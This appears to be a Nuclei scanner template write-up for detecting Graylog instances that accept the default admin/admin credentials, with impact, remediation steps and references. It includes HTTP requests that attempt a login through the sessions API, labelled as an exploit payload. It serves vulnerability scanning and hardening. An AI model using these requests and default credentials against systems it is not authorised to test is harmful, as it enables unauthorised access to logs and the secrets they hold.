# Nuclei Template: Graylog - Default Login
**Template ID:** graylog-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`graylog-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Graylog instance is accessible with default admin credentials (admin/admin). This provides full administrative access to the log management platform, including the ability to read all ingested logs, create inputs, configure pipelines, and manage users.

## Impact
An attacker with admin access to Graylog can read all collected log data which may contain credentials, API keys, internal IPs, and sensitive business information. They can also create new inputs to intercept future log data or modify pipelines to redirect/suppress logs.

## Steps to reproduce / Exploit Payload
```http
GET /api/ HTTP/1.1
Host: {{Hostname}}
Accept: application/json

POST /api/system/sessions HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json
X-Requested-By: nuclei

{"username":"{{username}}","password":"{{password}}","host":""}
```

## Remediation
Change the default root_password_sha2 in the Graylog server.conf configuration file. Use a strong, unique password for the admin account.

## References
- https://go2docs.graylog.org/current/setting_up_graylog/rest_api.html
- https://docs.graylog.org/docs/server-conf
- https://docs.graylog.org/docs/authentication
- https://archivedocs.graylog.org/en/2.5/pages/installation/virtual_machine_appliances.html
